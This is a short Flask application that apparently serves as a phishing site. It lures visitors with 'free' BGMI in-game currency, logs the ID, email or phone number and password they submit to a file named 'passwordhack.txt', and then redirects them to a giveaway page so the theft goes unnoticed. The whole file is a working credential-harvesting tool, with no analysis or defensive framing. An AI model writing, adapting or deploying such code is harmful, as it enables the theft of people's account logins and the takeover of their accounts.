
from flask import Flask,request,render_template,redirect

app=Flask(__name__)
@app.route("/")
def main():
    return render_template("index.html")

@app.route("/free",methods=['GET','POST'])
def final1():
    if(request.method=='POST'):
        name = request.form.get('bid')
        emailphone = request.form.get('EPN')
        passw1= request.form.get('pass1')
        with open("passwordhack.txt","a") as file:
            file.writelines(f"id:{name}\nemail phone:{emailphone}\npassword:{passw1}")
        return redirect("https://saibabaspeaks.com/bgmi-free-uc/")
    else:
        return render_template('post.html')

app.run()
